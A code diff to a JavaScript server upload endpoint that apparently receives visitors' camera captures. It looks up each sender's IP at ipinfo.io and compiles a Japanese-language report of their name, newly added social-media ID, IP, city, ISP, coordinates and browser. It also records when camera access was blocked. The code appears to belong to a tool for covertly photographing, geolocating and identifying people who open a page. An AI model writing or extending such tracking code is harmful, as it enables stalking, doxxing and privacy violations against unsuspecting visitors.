@@ -8,6 +8,7 @@ app.post("/upload", async (c) => {
   const formData = await c.req.formData();
   const file = formData.get("file");
   const name = formData.get("name").replaceAll("@", "@\\").slice(0, 20);
+  const snsId = formData.get("snsId").replaceAll("@", "@\\").slice(0, 20);
   const error = formData.get("error");
   const info = getConnInfo(c);
   if (!file && !error) {
@@ -18,7 +19,7 @@ app.post("/upload", async (c) => {
 
   const ipInfoJson = await (await fetch(`https://ipinfo.io/${ip}/json`)).json();
 
-  let message = `名前: ${name}\nIP: ${ip} (${ipInfoJson.city}, ${ipInfoJson.region}, ${ipInfoJson.country})\nISP: ${ipInfoJson.org}\n位置: ${ipInfoJson.loc}\nUA: ${c.req.header("User-Agent") || "Not Found"}\n\n`;
+  let message = `名前: ${name}\nSNS ID: ${snsId}\nIP: ${ip} (${ipInfoJson.city}, ${ipInfoJson.region}, ${ipInfoJson.country})\nISP: ${ipInfoJson.org}\n位置: ${ipInfoJson.loc}\nUA: ${c.req.header("User-Agent") || "Not Found"}\n\n`;
 
   if (error) {
     message += `カメラの起動を阻止されました`;
